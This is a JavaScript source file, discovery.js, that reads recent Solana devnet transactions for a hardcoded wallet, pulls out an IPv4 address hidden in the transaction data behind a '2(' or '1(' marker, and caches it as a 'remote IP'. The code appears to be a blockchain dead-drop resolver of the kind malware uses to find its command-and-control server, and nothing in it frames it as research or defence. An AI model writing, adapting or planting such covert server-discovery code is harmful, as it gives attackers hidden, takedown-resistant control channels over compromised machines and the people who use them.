// language: JavaScript, file: discovery.js
const SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
const SOLANA_RPC = "https://api.devnet.solana.com";

let cachedIp = null;

export function getRemoteIp() {
    return cachedIp;
}

export async function fetchSolanaIp() {
    try {
        const res = await fetch(SOLANA_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0", id: 1, method: "getSignaturesForAddress",
                params: [SOLANA_WALLET, { limit: 10 }]
            })
        });
        if (!res.ok) return;
        const json = await res.json();
        if (!json.result || !Array.isArray(json.result)) return;

        for (const sigObj of json.result) {
            const sig = sigObj.signature;
            const txRes = await fetch(SOLANA_RPC, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    jsonrpc: "2.0", id: 1, method: "getTransaction",
                    params: [sig, { encoding: "json" }]
                })
            });
            if (!txRes.ok) continue;
            const text = await txRes.text();
            
            // Look for 2(IP)
            let start = text.indexOf('2(');
            if (start === -1) {
                // Fallback to 1(IP) if 2(IP) doesn't exist
                start = text.indexOf('1(');
            }
            
            if (start !== -1) {
                const end = text.indexOf(')', start);
                if (end !== -1) {
                    const ip = text.substring(start + 2, end);
                    if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
                        if (cachedIp !== ip) {
                            console.log(`[solana] Remote IP updated: ${ip}`);
                            cachedIp = ip;
                        }
                        return;
                    }
                }
            }
        }
    } catch (e) {
        console.error(`[solana] fetch failed:`, e.message);
    }
}